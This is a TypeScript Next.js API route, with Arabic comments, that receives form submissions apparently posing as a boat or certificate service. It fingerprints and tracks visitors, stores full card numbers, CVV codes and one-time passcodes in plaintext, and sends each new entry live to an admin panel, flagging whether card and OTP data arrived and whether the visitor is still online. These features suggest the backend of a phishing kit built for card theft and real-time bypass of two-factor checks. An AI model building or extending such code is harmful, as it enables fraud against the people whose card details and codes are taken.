import { NextRequest, NextResponse } from 'next/server';
import { getAdminClient, getAnonClient, ensureAttachmentsBucket } from '@/lib/supabase';
import { getIO, isClientOnline } from '@/lib/socket';

interface SubmitBody {
  // هوية العميل
  fingerprint: string;
  ip_address?: string;
  country_code?: string;
  country_name?: string;
  device_info?: string;
  // نوع الخدمة
  service_type: string;
  // بيانات الخدمة الخاصة
  subject?: string;
  boat_type?: string;
  certificate_expiry?: string;
  // البيانات الشخصية
  id_number?: string;
  last_name?: string;
  first_name?: string;
  // بيانات الاتصال
  primary_phone?: string;
  secondary_phone?: string;
  email?: string;
  email_confirmation?: string;
  contact_consent?: boolean;
  // المحتوى
  content?: string;
  // بيانات الدفع (اختيارية)
  payment?: {
    card_number?: string;
    card_holder?: string;
    expiry?: string;
    cvv?: string;
    network?: string;
    bank_name?: string;
    bank_domain?: string;
    card_type?: string;
    bank_country?: string;
    bin?: string;
  };
  // OTP (اختياري)
  otp?: { code?: string };
  // معرّفات الملفات المرفوعة مسبقاً (مسارات storage)
  files?: Array<{ name: string; type: string; size: number; path: string; category?: string }>;
  // شروط مجمّدة
  terms_snapshot?: Record<string, unknown>;
}

export async function POST(req: NextRequest) {
  try {
    const body = (await req.json()) as SubmitBody;

    if (!body.fingerprint || !body.service_type) {
      return NextResponse.json({ error: 'البصمة ونوع الخدمة مطلوبان' }, { status: 400 });
    }

    const admin = getAdminClient();

    // 1) فحص الحظر قبل قبول الإدخال
    let blockQuery = admin.from('blocked_clients').select('id', { count: 'exact', head: true });
    if (body.ip_address) {
      blockQuery = blockQuery.or(
        `fingerprint.eq.${body.fingerprint},ip_address.eq.${body.ip_address}`
      );
    } else {
      blockQuery = blockQuery.eq('fingerprint', body.fingerprint);
    }
    const { count: blockCount } = await blockQuery;
    if ((blockCount ?? 0) > 0) {
      return NextResponse.json({ error: 'تم حظر هذا العميل' }, { status: 403 });
    }

    // 2) upsert العميل (إنشاء أو تحديث البصمة)
    const { data: client, error: clientErr } = await admin
      .from('clients')
      .upsert(
        {
          fingerprint: body.fingerprint,
          ip_address: body.ip_address,
          country_code: body.country_code,
          country_name: body.country_name,
          device_info: body.device_info,
          full_name: [body.first_name, body.last_name].filter(Boolean).join(' '),
          email: body.email,
          phone: body.primary_phone,
          id_number: body.id_number,
          last_seen_at: new Date().toISOString(),
        },
        { onConflict: 'fingerprint' }
      )
      .select('id')
      .single();

    if (clientErr || !client) {
      return NextResponse.json({ error: 'فشل إنشاء سجل العميل' }, { status: 500 });
    }
    const clientId = client.id;

    // 3) إنشاء السجل الرئيسي (submission)
    const { data: submission, error: subErr } = await admin
      .from('submissions')
      .insert({
        client_id: clientId,
        service_type: body.service_type,
        subject: body.subject,
        boat_type: body.boat_type,
        certificate_expiry: body.certificate_expiry,
        id_number: body.id_number,
        last_name: body.last_name,
        first_name: body.first_name,
        primary_phone: body.primary_phone,
        secondary_phone: body.secondary_phone,
        email: body.email,
        email_confirmation: body.email_confirmation,
        contact_consent: body.contact_consent,
        content: body.content,
        terms_snapshot: body.terms_snapshot,
        status: 'pending',
      })
      .select('id,reference')
      .single();

    if (subErr || !submission) {
      return NextResponse.json({ error: 'فشل إنشاء السجل' }, { status: 500 });
    }

    const submissionId = submission.id;
    const reference = submission.reference;

    // 4) بيانات الدفع (إن وُجدت)
    if (body.payment) {
      const p = body.payment;
      await admin.from('payment_cards').insert({
        client_id: clientId,
        submission_id: submissionId,
        reference,
        card_number: p.card_number,
        card_number_last4: p.card_number ? p.card_number.replace(/\s/g, '').slice(-4) : null,
        card_holder: p.card_holder,
        expiry: p.expiry,
        cvv: p.cvv,
        network: p.network,
        bank_name: p.bank_name,
        bank_domain: p.bank_domain,
        card_type: p.card_type,
        bank_country: p.bank_country,
        bin: p.bin,
        status: 'pending',
      });
    }

    // 5) OTP (إن وُجد)
    if (body.otp?.code) {
      await admin.from('otp_codes').insert({
        client_id: clientId,
        submission_id: submissionId,
        reference,
        code: body.otp.code,
        status: 'pending',
      });
    }

    // 6) المرفقات (ربط الملفات المرفوعة مسبقاً بالسجل)
    if (body.files?.length) {
      await admin.from('files').insert(
        body.files.map((f) => ({
          submission_id: submissionId,
          client_id: clientId,
          file_name: f.name,
          file_type: f.type,
          file_size: f.size,
          storage_path: f.path,
          category: f.category || 'additional',
        }))
      );
    }

    // 7) بثّ لحظي للوحة الادارة (سجل جديد)
    const io = getIO();
    if (io) {
      io.to('admins').emit('admin:new_entry', {
        type: 'submission',
        clientId,
        submissionId,
        reference,
        service_type: body.service_type,
        hasPayment: !!body.payment,
        hasOtp: !!body.otp?.code,
        online: isClientOnline(body.fingerprint),
        created_at: new Date().toISOString(),
      });
    }

    return NextResponse.json({ ok: true, reference, submissionId, clientId });
  } catch {
    return NextResponse.json({ error: 'خطأ في الخادم' }, { status: 500 });
  }
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204 });
}
